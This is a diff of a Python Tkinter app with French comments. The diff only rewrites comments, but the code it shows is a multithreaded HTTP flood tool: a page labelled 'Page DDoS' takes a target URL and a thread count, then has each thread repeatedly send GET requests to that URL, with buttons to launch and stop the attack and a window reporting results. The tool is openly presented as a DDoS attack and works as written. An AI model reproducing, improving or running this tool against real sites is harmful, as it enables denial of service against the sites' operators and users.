@@ -8,10 +8,10 @@ class DdosPage(tk.Frame):
     def __init__(self, parent, controller):
         super().__init__(parent)
         self.stop_event = Event()  # Event pour arrêter les threads
-        self.attack_start_time = None  # Temps de début de l'attaque
-        self.attack_end_time = None  # Temps de fin de l'attaque
+        self.attack_start_time = None  # Timer début de l'attaque
+        self.attack_end_time = None  # Timer fin de l'attaque
         self.completed_requests = 0  # Compteur des requêtes effectuées
-        self.results_displayed = False  # Nouveau drapeau pour éviter plusieurs fenêtres
+        self.results_displayed = False  # Drapeau pour éviter plusieurs fenêtres
         
         labelAttack = tk.Label(self, text="Page DDoS", font=("Arial", 16))
         labelAttack.pack(pady=20)
@@ -32,7 +32,7 @@ class DdosPage(tk.Frame):
         
         tk.Label(self, text="Nombre de threads :").pack(pady=5)
         self.threadsEntry = tk.Entry(self, width=10)
-        self.threadsEntry.insert(0, "1")  # Nombre de threads par défaut
+        self.threadsEntry.insert(0, "1")  # Nb threads par défaut
         self.threadsEntry.pack(pady=5)
         
         self.start_button = tk.Button(self, text="Lancer l'attaque DDoS", command=self.start_attack)
@@ -46,14 +46,14 @@ class DdosPage(tk.Frame):
     
     def start_attack(self):
         url = self.url_entry.get()
-        if not url:  # Vérifie si l'URL est vide
+        if not url: # Vérification URL vide ?
             self.status_label.config(text="Erreur : veuillez entrer une URL valide.")
             return
 
         # Vérification de l'URL
         try:
             # Test rapide pour valider l'URL
-            requests.head(url, timeout=5)  # Utilisation de 'head' pour minimiser la charge
+            requests.head(url, timeout=5)# Utilisation de "head" pour minimiser la charge
         except requests.exceptions.MissingSchema:
             self.status_label.config(
                 text=f"Erreur : Invalid URL '{url}': No scheme supplied. Perhaps you meant https://{url}?"
@@ -68,63 +68,62 @@ class DdosPage(tk.Frame):
         self.numThreads = int(self.threadsEntry.get())
         
         if url:
-            self.attack_start_time = time.time()  # Enregistrer le moment où l'attaque commence
-            self.stop_event.clear()  # Réinitialise l'Event pour permettre une nouvelle attaque
-            self.completed_requests = 0  # Réinitialise le compteur de requêtes
-            self.results_displayed = False  # Réinitialise le drapeau pour permettre l'affichage des résultats
+            self.attack_start_time = time.time() # Enregistre le moment où l'attaque commence
+            self.stop_event.clear() # Réinitialise l'Event pour permettre une nouvelle attaque
+            self.completed_requests = 0 # Réinitialise le compteur de requêtes
+            self.results_displayed = False # Réinitialise le drapeau pour permettre l'affichage des résultats
             self.status_label.config(text="Lancement en cours...")
-            self.stop_button.config(state="normal")  # Activer le bouton "Stopper l'attaque"
-            self.start_button.config(state="disabled")  # Désactiver le bouton "Lancer l'attaque"
+            self.stop_button.config(state="normal")# Active le bouton "Stopper l'attaque"
+            self.start_button.config(state="disabled") # Désactive le bouton "Lancer l'attaque"
             
-            # Lancer autant de threads que spécifié
+            # Lance autant de threads que spécifié
             for _ in range(self.numThreads):
                 thread = Thread(target=self.ddos_attack, args=(url, self.numRequests, self.interval))
-                thread.daemon = True  # Assurez-vous que le thread se termine avec l'application
+                thread.daemon = True  #  on s'assure que thread se termine avec l'application
                 thread.start()
     
     def ddos_attack(self, url, num_requests, interval):
         try:
             for _ in range(num_requests):
-                if self.stop_event.is_set():  # Vérifie si un arrêt a été demandé
+                if self.stop_event.is_set(): # Vérifie si un arrêt a été demandé
                     break
-                start_time = time.time()  # Début de la requête
-                requests.get(url)  # Exécution de la requête
+                start_time = time.time()# Début de la requête
+                requests.get(url) # Exécution de la requête
                 self.completed_requests += 1
-                elapsed = time.time() - start_time  # Durée de la requête
-                # Ajuster l'intervalle pour respecter le délai total souhaité
-                time_to_wait = max(0, interval - elapsed)
+                elapsed = time.time() - start_time # Durée de la requête
+                time_to_wait = max(0, interval - elapsed)# Ajustement de l'intervalle pour respecter le délai total souhaité
                 time.sleep(time_to_wait)
         except Exception as e:
             self.status_label.config(text=f"Erreur : {e}")
         finally:
-            self.attack_end_time = time.time()  # Enregistrer le moment où l'attaque s'arrête
+            self.attack_end_time = time.time() # Enregistrement du moment où l'attaque s'arrête
             self.reset_buttons()
-            if not self.results_displayed:  # Appelle `show_results` une seule fois
+            if not self.results_displayed: # Appelle 'show_results' une seule fois
                 self.show_results()
                 self.results_displayed = True
     
     def stop_attack(self):
-        self.stop_event.set()  # Signale aux threads de s'arrêter
-        self.attack_end_time = time.time()  # Enregistre l'heure d'arrêt
+        self.stop_event.set() # Signale aux threads de s'arrêter
+        self.attack_end_time = time.time() # Enregistrement de l'heure d'arrêt
         self.status_label.config(text="Attaque interrompue.")
         self.reset_buttons()
-        if not self.results_displayed:  # Appelle `show_results` une seule fois
+        if not self.results_displayed: # Appelle 'show_results' une seule fois
             self.show_results()
             self.results_displayed = True
     
     def reset_buttons(self):
         #Réinitialise les boutons après l'arrêt de l'attaque
-        self.start_button.config(state="normal")  # Réactiver le bouton "Lancer l'attaque"
-        self.stop_button.config(state="disabled")  # Désactiver le bouton "Stopper l'attaque"
-        self.status_label.config(text="")  # Réinitialiser le texte de statut
+        self.start_button.config(state="normal") # Réactivation du bouton "Lancer l'attaque"
+        self.stop_button.config(state="disabled") # Désactivation du bouton "Stopper l'attaque"
+        self.status_label.config(text="") # Réinitialisation du texte de statut
     
     def show_results(self):
         #Affiche les résultats de l'attaque dans une nouvelle fenêtre.
         if not self.attack_start_time or not self.attack_end_time:
-            return  # Si l'attaque n'a pas été correctement démarrée ou terminée
+            return # Si l'attaque n'a pas été correctement démarrée ou terminée
         
-        elapsed_time = self.attack_end_time - self.attack_start_time  # Temps écoulé
-        initial_time = self.numRequests * self.interval  # Temps initial estimé
+        elapsed_time = self.attack_end_time - self.attack_start_time # Temps écoulé
+        initial_time = self.numRequests * self.interval # Temps initial estimé
         
         # Nouvelle fenêtre pour afficher les résultats
         results_window = Toplevel(self)
